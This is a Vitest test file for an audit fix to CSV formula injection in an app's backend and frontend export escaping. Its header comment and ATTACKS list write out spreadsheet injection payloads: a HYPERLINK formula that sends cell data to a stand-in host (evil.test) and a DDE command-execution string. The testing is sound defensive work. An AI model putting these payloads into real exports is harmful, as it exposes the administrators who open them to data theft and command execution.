import { describe, expect, it } from "vitest";
import { csvEscape as backendEscape, needsFormulaGuard } from "@atlas/core/csv/escape";
import { csvEscape as frontendEscape } from "../../../frontend/apps/web/src/lib/export/csv";

/**
 * Audit finding M1 — CSV formula injection.
 *
 * Eight separate `csvEscape` implementations existed across the backend and web
 * app. Every one quoted correctly (commas, quotes, newlines) and **none**
 * neutralised a leading `=`, `+`, `-`, `@`, tab or carriage return.
 *
 * The data is learner-controlled and the reader is an administrator, so a
 * display name of `=HYPERLINK("https://evil.test?d="&A1,"Click")` is evaluated
 * when the export is opened in Excel, Sheets or LibreOffice. Quoting does not
 * help — the spreadsheet strips quotes before evaluating the cell.
 *
 * Both implementations are asserted because the web app cannot import
 * `@atlas/core`; it depends only on `@atlas/contracts` and
 * `@atlas/design-system`. If they ever diverge, this fails.
 */

const implementations = [
  ["backend @atlas/core/csv/escape", backendEscape],
  ["frontend lib/export/csv", frontendEscape],
] as const;

const ATTACKS = [
  '=HYPERLINK("https://evil.test","Click")',
  "=1+1",
  "+1+1",
  "-1+1",
  "@SUM(A1:A9)",
  "=cmd|'/c calc'!A1",
  "\tleading tab",
  "\rleading cr",
];

describe.each(implementations)("csvEscape (%s)", (_label, escape) => {
  it("prefixes every formula trigger with an apostrophe", () => {
    for (const attack of ATTACKS) {
      const out = escape(attack);
      // The guard must be the first character of the cell value — inside the
      // quotes when quoting applies, since outside them it would be data.
      const unquoted = out.startsWith('"') ? out.slice(1) : out;
      expect(unquoted.startsWith("'"), `${JSON.stringify(attack)} -> ${out}`).toBe(true);
    }
  });

  it("leaves ordinary values untouched", () => {
    expect(escape("Ada Lovelace")).toBe("Ada Lovelace");
    expect(escape("learner@example.test")).toBe("learner@example.test");
    expect(escape("")).toBe("");
    expect(escape(null)).toBe("");
    expect(escape(undefined)).toBe("");
  });

  it("keeps plain numbers numeric, including negatives", () => {
    // Guarding every "-" would turn every negative amount in an export into
    // text and silently break totals in the sheet.
    expect(escape("-12.5")).toBe("-12.5");
    expect(escape(-12.5)).toBe("-12.5");
    expect(escape("42")).toBe("42");
    // ...but a negative that continues into an expression is still a formula.
    expect(escape("-1+1").startsWith("'")).toBe(true);
  });

  it("still quotes per RFC 4180", () => {
    expect(escape('say "hi"')).toBe('"say ""hi"""');
    expect(escape("a,b")).toBe('"a,b"');
    expect(escape("line1\nline2")).toBe('"line1\nline2"');
  });

  it("quotes and guards together", () => {
    // A value that both triggers a formula and needs quoting.
    expect(escape('=A1,"x"')).toBe('"\'=A1,""x"""');
  });
});

describe("needsFormulaGuard", () => {
  it("identifies the trigger characters", () => {
    for (const char of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(needsFormulaGuard(`${char}payload`), char).toBe(true);
    }
    expect(needsFormulaGuard("safe")).toBe(false);
    expect(needsFormulaGuard("-42")).toBe(false);
  });
});
